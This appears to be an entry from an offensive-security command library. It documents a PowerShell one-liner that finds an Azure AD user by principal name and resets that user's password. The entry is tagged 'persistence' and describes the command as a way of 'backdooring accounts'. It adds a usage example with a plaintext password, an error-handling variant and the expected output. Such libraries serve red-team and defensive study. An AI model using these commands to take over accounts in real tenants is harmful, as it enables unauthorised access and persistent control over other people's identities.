---
id: 301c0647-3342-4f78-8088-7ec8e479de1a
name: set-azuread-user-password-by-upn
type: command
executor: powershell
data: >-
  (Get-AzureADUser -All $true | Where-Object {$_.UserPrincipalName -eq
  "$_USERNAME@$_TENANT.onmicrosoft.com"}).ObjectId | Set-AzureADUserPassword
  -Password $password -Verbose
output: null
created_at: '2023-04-06T03:56:15.848123+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Azure
  - Cloud
tags:
  - persistence
  - azure-ad
verified: true
validated: true
---

# set-azuread-user-password-by-upn

## Command

```powershell
(Get-AzureADUser -All $true | Where-Object {$_.UserPrincipalName -eq "$_USERNAME@$_TENANT.onmicrosoft.com"}).ObjectId | Set-AzureADUserPassword -Password $password -Verbose
```

## Description

Locates a user by UPN across all users and sets their password using a pre-created secure string. This enables password resets for backdooring accounts in Azure AD.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -All | Queries all users (use with caution on large tenants) | Yes |
| UserPrincipalName | Filters by UPN | Yes |
| $_USERNAME | Username part of UPN | Yes |
| $_TENANT | Tenant name | Yes |
| -Password | Secure string password object | Yes |
| $password | Variable holding secure string | Yes |
| -Verbose | Detailed output | Optional |

## Examples

### Basic Usage

```powershell
$password = "NewP@ss123" | ConvertTo-SecureString -AsPlainText -Force
(Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "jdoe@contoso.onmicrosoft.com"}).ObjectId | Set-AzureADUserPassword -Password $password -Verbose
```

### Advanced Usage

With error handling:

```powershell
try { (Get-AzureADUser -Filter "userPrincipalName eq '$_USERNAME@$_TENANT.onmicrosoft.com'").ObjectId | Set-AzureADUserPassword -Password $password } catch { Write-Error "User not found or insufficient perms" }
```

## Expected Output

Verbose confirmation: "Password updated successfully for user [UPN]." No errors indicate success; watch for permission denied if not authorized.

## Related

- [[commands/create-secure-string-from-plaintext]]
- [[procedures/Azure-AD-Administrative-Unit-Management]]
